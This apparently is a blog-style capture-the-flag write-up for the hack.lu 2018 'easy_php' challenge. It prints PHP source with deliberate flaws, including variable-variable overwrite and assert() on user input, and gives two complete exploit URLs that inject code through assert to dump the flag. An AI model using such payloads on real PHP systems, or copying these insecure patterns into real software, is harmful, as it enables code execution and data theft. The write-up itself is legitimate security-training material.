---
title: hack-lu
abbrlink: 30021
date: 2018-10-17 20:45:50
tags:
---

# easy_php

```
<?php

require_once('flag.php');
error_reporting(0);


if(!isset($_GET['msg'])){
    highlight_file(__FILE__);
    die();
}

@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}

echo "Hello Hacker! Have a look around.\n";

@$k1=$_GET['key1'];
@$k2=$_GET['key2'];

$cc = 1337;$bb = 42;

if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}

if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){
            @$cc = $_GET['cc'];
        }
    }
}

list($k1,$k2) = [$k2, $k1];

if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}

$‮b = "2";$a="‮b";//;1=b

if($$a !== $k1){
    die("lel no\n");
}

// plz die now
assert_options(ASSERT_BAIL, 1);
assert("$bb == $cc");

echo "Good Job ;)";
// TODO
// echo $flag;
```

一个一个绕过即可。

```
https://arcade.fluxfingers.net:1819/?msg=data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ==&key1=1337a&key2=000000000000000000000000000000000001337%EF%BC%84&cc[]=&a=k1&bb=var_dump($flag);//&k1=2
or:
https://arcade.fluxfingers.net:1819/?bb=print_r%28%24flag%29%3B%2F%2F&key2=000000000000000000000000000000000001337%EF%BC%84&key1=1337&k1=2&cc%5B%5D=&msg=data%3A%2F%2Ftext%2Fplain%2CHello+Challenge%21.
```

